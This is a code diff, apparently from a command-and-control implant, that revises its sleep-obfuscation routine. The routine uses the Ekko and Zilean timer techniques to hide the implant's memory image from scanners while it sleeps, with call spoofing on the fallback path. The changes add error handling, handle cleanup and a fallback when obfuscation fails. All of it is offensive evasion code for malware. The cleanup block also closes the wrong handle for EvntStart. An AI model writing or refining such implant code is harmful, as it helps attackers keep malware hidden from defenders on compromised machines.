@@ -376,14 +376,17 @@ BOOL TimerObf(
     Key.Length = Key.MaximumLength = sizeof( Buf );
 
     /* set agent memory pointer and size */
-    Img.Buffer = ImgBase = Instance.Session.ModuleBase;
+    Img.Buffer = ImgBase           = Instance.Session.ModuleBase;
     Img.Length = Img.MaximumLength = ImgSize = IMAGE_SIZE( Instance.Session.ModuleBase );
 
     if ( Method == SLEEPOBF_EKKO ) {
-        NtStatus = Instance.Win32.RtlCreateTimerQueue( &Queue );
+        if ( ! NT_SUCCESS( NtStatus = Instance.Win32.RtlCreateTimerQueue( &Queue ) ) ) {
+            PRINTF( "RtlCreateTimerQueue Failed => %p\n", NtStatus )
+            goto LEAVE;
+        }
     } else if ( Method == SLEEPOBF_ZILEAN ) {
         if ( ! NT_SUCCESS( NtStatus = Instance.Win32.NtCreateEvent( &EvntWait, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) ) {
-            PRINTF( "NtCreateEvent Failed => %p", NtStatus )
+            PRINTF( "NtCreateEvent Failed => %p\n", NtStatus )
             goto LEAVE;
         }
     }
@@ -546,45 +549,53 @@ BOOL TimerObf(
 
                     /* just wait for the sleep to end */
                     if ( ! ( Success = NT_SUCCESS( NtStatus = Instance.Syscall.NtSignalAndWaitForSingleObject( EvntStart, EvntDelay, FALSE, NULL ) ) ) ) {
-                        PRINTF( "NtSignalAndWaitForSingleObject Failed => %p", NtStatus );
+                        PRINTF( "NtSignalAndWaitForSingleObject Failed => %p\n", NtStatus );
+                    } else {
+                        Success = TRUE;
                     }
                 } else {
-                    PRINTF( "RtlCreateTimer/RtlRegisterWait Failed: %lx", NtStatus )
+                    PRINTF( "RtlCreateTimer/RtlRegisterWait Failed: %lx\n", NtStatus )
                 }
             } else {
-                PRINTF( "RtlCreateTimer/RtlRegisterWait Failed: %lx", NtStatus )
+                PRINTF( "RtlCreateTimer/RtlRegisterWait Failed: %lx\n", NtStatus )
             }
         } else {
-            PRINTF( "NtCreateEvent Failed: %lx", NtStatus )
+            PRINTF( "NtCreateEvent Failed: %lx\n", NtStatus )
         }
     } else {
-        PRINTF( "RtlCreateTimerQueue Failed: %lx", NtStatus )
+        PRINTF( "RtlCreateTimerQueue Failed: %lx\n", NtStatus )
     }
 
 
 LEAVE: /* cleanup */
     if ( Queue ) {
         Instance.Win32.RtlDeleteTimerQueue( Queue );
+        Queue = NULL;
     }
 
     if ( EvntTimer ) {
         Instance.Win32.NtClose( EvntTimer );
+        EvntTimer = NULL;
     }
 
     if ( EvntStart ) {
         Instance.Win32.NtClose( EvntTimer );
+        EvntStart = NULL;
     }
 
     if ( EvntDelay ) {
         Instance.Win32.NtClose( EvntDelay );
+        EvntDelay = NULL;
     }
 
     if ( EvntWait ) {
         Instance.Win32.NtClose( EvntWait );
+        EvntWait = NULL;
     }
 
     if ( ThdSrc ) {
         Instance.Win32.NtClose( ThdSrc );
+        ThdSrc = NULL;
     }
 
     /* clear the structs from stack */
@@ -697,12 +708,14 @@ VOID SleepObf(
         /* timer api based sleep obfuscation */
         case SLEEPOBF_EKKO:
         case SLEEPOBF_ZILEAN: {
-            TimerObf( TimeOut, Technique );
+            if ( ! TimerObf( TimeOut, Technique ) ) {
+                goto DEFAULT;
+            }
             break;
         }
 
         /* default */
-        case SLEEPOBF_NO_OBF: {}; default: {
+        DEFAULT: case SLEEPOBF_NO_OBF: {}; default: {
             SpoofFunc(
                 Instance.Modules.KernelBase,
                 IMAGE_SIZE( Instance.Modules.KernelBase ),
